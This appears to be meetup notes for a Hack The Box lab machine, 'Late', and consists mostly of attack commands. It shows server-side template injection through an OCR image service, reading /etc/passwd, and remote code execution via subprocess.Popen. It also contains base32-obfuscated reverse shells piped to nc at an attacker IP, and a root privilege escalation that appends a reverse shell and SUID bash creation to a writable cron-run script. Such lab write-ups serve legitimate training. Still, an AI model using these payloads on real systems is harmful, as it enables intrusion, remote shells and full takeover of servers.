

# hackdewereld meetup 18-08-2022
late.htb

# hosts
late.htb 
image.late.htb # vuln for ssti


# special setting:

If your convert commands fails in the proxy use this command:

```bash
ls /etc/ImageMagick*/policy.xml | while read line; do cp $line $line.bak; done; sed -i 's/16KP/128KP/g' /etc/ImageMagick*/policy.xml
```

# what to do
- make image

I chose to make a mitm proxy solution for this.

- send to server with ocr

You can use curl while running the mitmproxy like this:
```bash
# pane 1
mitmdump --listen-port 8800 -k -s mitm_p_script.py
# pane 2
curl -x 'http://localhost:8800' -d 'ssti={{7*7}}' http://images.late.htb/haxhaxhax
```

The haxhaxhax is injected via mitmproxy.

- ssti

I've tried using tpl-map on this proxy but that didn't work.

```bash
python2 tplmap.py -u http://images.late.htb/haxhaxhax -d 'ssti=' --proxy 'http://localhost:8800'
```

So let's do it manual.

```bash
curl -x 'http://localhost:8800' -d 'ssti={{7*7}}' http://images.late.htb/haxhaxhax
curl -x 'http://localhost:8800' -d 'ssti={{"7"*7}}' http://images.late.htb/haxhaxhax
# python2 tplmap.py -u http://images.late.htb/haxhaxhax -d 'ssti=*' --proxy 'http://localhost:8800'

# read /etc/passwd on the server:
curl -Ssx 'http://localhost:8800' -d 'ssti={{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}' http://images.late.htb/haxhaxhax

# get all subclasses:
curl -Ssx 'http://localhost:8800' -d 'ssti=abcde {% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %} asdfb' http://images.late.htb/haxhaxhax | w3m -dump -T text/html

# get subprocesses number:
curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__() }} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html | tr -d '\n' | sed "s|'>, <|\n|g" | sed "s|'>,<class '|\nclass |g" | grep -in popen
# 243: class'subprocess.Popen
# 475:class 'click.utils.KeepOpenFile
```

Rce:

```bash
# pane 1
ip=$(ip a s tun0 | grep inet | head -n1 | awk '{print $2}' | cut -d/ -f1)
port=9000

index=$(curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__() }} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html  | tr -d '\n' | sed "s|'>, <|\n|g" | sed "s|'>,<class '|\nclass |g" | grep -in popen | head -n1 | cut -d : -f 1)
curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))']("id",shell=True,stdout=-1).communicate()[0].strip()}} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html
curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))'](request.args.input,shell=True,stdout=-1).communicate()[0].strip()}} ' -d 'input=echo '$(echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc '$ip' '$port' >/tmp/f' | base32 -w 0)' | base32 -d | bash' http://images.late.htb/haxhaxhax

# pane 2
nc -lvnp 9000 
# or 
stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp 9000 && reset
```




# privesc
- writable sbin folder that is exec by root crontab


```bash
# rev shell:
echo "echo $(echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 443 >/tmp/f' | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1
# suid bin:
echo -e 'cp /bin/bash /tmp/bash\nchown root:root /tmp/bash\nchmod +x /tmp/bash\nchmod u+s /tmp/bash' >> /usr/local/sbin/ssh-alert.sh;echo bla | ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1 ; /tmp/bash -p
```

and execute it by using ssh on the server

```bash
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1
```


```bash
index=$(curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__() }} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html  | tr -d '\n' | sed "s|'>, <|\n|g" | sed "s|'>,<class '|\nclass |g" | grep -in popen | head -n1 | cut -d : -f 1)
curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))'](request.args.input,shell=True,stdout=-1).communicate()[0].strip()}} ' -d 'input=echo '$(echo 'echo "echo $(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 443 >/tmp/f" | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1' | base32 -w 0)' | base32 -d | bash' http://images.late.htb/haxhaxhax
```


# ORC POC

```bash
kill -9 $(ps aux | grep -i mitm | awk '{print $2}'); pkill nc; ./one-click-root.py
```

![](late.htb/ocr.gif)
